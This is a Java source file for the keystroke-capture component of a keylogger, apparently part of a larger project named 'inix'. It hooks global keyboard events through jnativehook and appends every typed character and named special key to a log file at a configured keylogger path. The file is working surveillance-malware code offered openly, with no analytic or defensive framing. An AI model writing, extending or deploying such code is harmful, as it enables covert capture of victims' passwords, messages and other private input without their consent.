package ml.inix.loggers;

import ml.inix.Config;
import ml.inix.util.Color;
import ml.inix.util.Log;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

public class NativeKeyboard implements NativeKeyListener {

    private final String path = Config.PATH_KEYLOGGER + "logs.txt";

    private void saveLog(String s) {
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(path, true))) {
            bw.write(s);
        } catch (IOException e) {
            Log.out(Color.RED + e.getMessage());
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        if (getKey(nativeKeyEvent.getRawCode()) != null) saveLog(getKey(nativeKeyEvent.getRawCode()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        saveLog(String.valueOf(nativeKeyEvent.getKeyChar()));
    }

    private String getKey(int code) {
        switch (code) {
            case 8:
                return("[Backspace]");
            case 9:
                return("[Tab]");
            case 13:
                return("[Enter]");
            case 19:
                return("[PauseBreak]");
            case 27:
                return("[Esc]");
            case 33:
                return("[PgUp]");
            case 34:
                return("[PgDown]");
            case 35:
                return("[End]");
            case 36:
                return("[Home]");
            case 37:
                return("[Left]");
            case 38:
                return("[Up]");
            case 39:
                return("[Right]");
            case 40:
                return("[Down]");
            case 44:
                return("[PrintScreen]");
            case 45:
                return("[Insert]");
            case 46:
                return("[Del]");
            case 112:
                return("[F1]");
            case 113:
                return("[F2]");
            case 114:
                return("[F3]");
            case 115:
                return("[F4]");
            case 116:
                return("[F5]");
            case 117:
                return("[F6]");
            case 118:
                return("[F7]");
            case 119:
                return("[F8]");
            case 120:
                return("[F9]");
            case 121:
                return("[F10]");
            case 122:
                return("[F11]");
            case 123:
                return("[F12]");
            case 144:
                return("[NumLock]");
            case 162:
                return("[Ctrl]");
            case 163:
                return("[Ctrl]");
            case 164:
                return("[Alt]");
            case 165:
                return("[Alt]");
            default:
                return(null);
        }
    }
}
